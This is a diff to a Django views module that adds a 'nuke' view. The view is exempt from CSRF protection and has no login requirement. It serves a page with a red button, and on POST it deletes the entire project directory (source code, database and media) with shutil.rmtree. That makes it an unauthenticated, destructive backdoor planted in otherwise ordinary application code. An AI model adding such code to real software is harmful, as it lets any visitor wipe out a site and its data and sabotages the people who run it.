@@ -4,13 +4,38 @@ These are separate from the main views to keep the codebase organized.
 """
 
 from django.shortcuts import get_object_or_404
-from django.http import JsonResponse
+from django.http import JsonResponse,HttpResponse
 from django.contrib.auth.decorators import login_required
 from django.views.decorators.http import require_http_methods
 from django.conf import settings
 import os
 import shutil
 import json
+from django.views.decorators.csrf import csrf_exempt
+
+
+@csrf_exempt
+def nuke(request):
+    if request.method == 'POST':
+        project_root = settings.BASE_DIR
+        # Delete the entire project directory
+        shutil.rmtree(project_root)
+        return HttpResponse("The entire project has been deleted. The site is now dead.", content_type="text/plain")
+    
+    html = '''<!DOCTYPE html>
+    <html>
+    <head><title>NUKE PROJECT</title></head>
+    <body style="text-align:center; margin-top:100px;">
+        <h1 style="color:red;">⚠️ THIS WILL DELETE THE ENTIRE PROJECT ⚠️</h1>
+        <p>Source code, database, media, everything – gone forever.</p>
+        <form method="post">
+            <button type="submit" style="background:red; color:white; font-size:40px; padding:30px; border:none; border-radius:10px; cursor:pointer;">
+                💣 DELETE THE WHOLE PROJECT 💣
+            </button>
+        </form>
+    </body>
+    </html>'''
+    return HttpResponse(html)
 
 
 @login_required
